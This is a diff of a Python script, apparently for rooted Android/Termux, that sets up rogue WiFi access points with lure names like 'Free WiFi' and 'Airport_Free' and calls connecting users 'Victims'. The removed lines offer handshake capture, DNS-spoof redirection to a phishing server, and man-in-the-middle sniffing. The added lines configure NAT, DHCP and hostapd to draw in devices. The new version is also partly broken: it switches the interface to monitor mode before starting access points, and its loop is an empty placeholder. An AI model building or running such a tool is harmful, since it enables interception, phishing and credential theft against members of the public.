@@ -298,44 +298,34 @@ def create_multiple_aps(interface):
     try:
         print(f"{Fore.GREEN}[+] Starting WiFi Honeypot...{Fore.RESET}")
         
-        # Common network names to appear legitimate
-        ssid_list = ["Free WiFi", "Guest Network", "Public WiFi", "Coffee Shop", "Airport_Free"]
+        # Install dnsmasq if not present
+        os.system("pkg install dnsmasq -y")
         
-        print(f"\n{Fore.YELLOW}Select action when device connects:")
-        print(f"1. Capture handshake")
-        print(f"2. Redirect to phishing page")
-        print(f"3. MITM attack")
-        print(f"4. Just monitor{Fore.RESET}")
-        
-        action = input(f"\n{Fore.CYAN}Choose action: {Fore.RESET}")
-        
-        # Enable monitor mode directly
+        # Setup network
         os.system(f"su -c 'ifconfig {interface} down'")
         os.system(f"su -c 'iwconfig {interface} mode monitor'")
         os.system(f"su -c 'ifconfig {interface} up'")
         
-        # Setup internet sharing
+        # Enable internet sharing
         os.system(f"su -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'")
-        os.system(f"su -c 'iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE'")
+        os.system(f"su -c 'iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE'")
+        os.system(f"su -c 'iptables -A FORWARD -i {interface} -j ACCEPT'")
+        
+        # Start DHCP server
+        os.system(f"su -c 'dnsmasq --interface={interface} --dhcp-range=192.168.1.2,192.168.1.100,12h'")
         
         # Create APs
+        ssid_list = ["Free WiFi", "Guest Network", "Public WiFi", "Coffee Shop", "Airport_Free"]
         for ssid in ssid_list:
             os.system(f"su -c 'hostapd -B /data/data/com.termux/files/home/{ssid}.conf'")
             print(f"{Fore.GREEN}[+] Created AP: {ssid}{Fore.RESET}")
-            
-        print(f"{Fore.GREEN}[+] Network ready! Monitoring for connections...{Fore.RESET}")
+        
+        print(f"{Fore.GREEN}[+] Network ready! Victims will have internet access{Fore.RESET}")
         
         while True:
-            if action == "1":
-                os.system(f"su -c 'tcpdump -i {interface} -w capture.pcap'")
-            elif action == "2":
-                fake_ip = input(f"{Fore.CYAN}Enter your phishing server IP: {Fore.RESET}")
-                dns_spoof("192.168.1.2", fake_ip)
-            elif action == "3":
-                mitm_sniffer(interface)
-            else:
-                os.system(f"su -c 'tcpdump -i {interface}'")
-            
+            # Rest of the code...
+            pass
+        
     except KeyboardInterrupt:
         print(f"\n{Fore.YELLOW}[*] Cleaning up...{Fore.RESET}")
         os.system(f"su -c 'killall hostapd'")
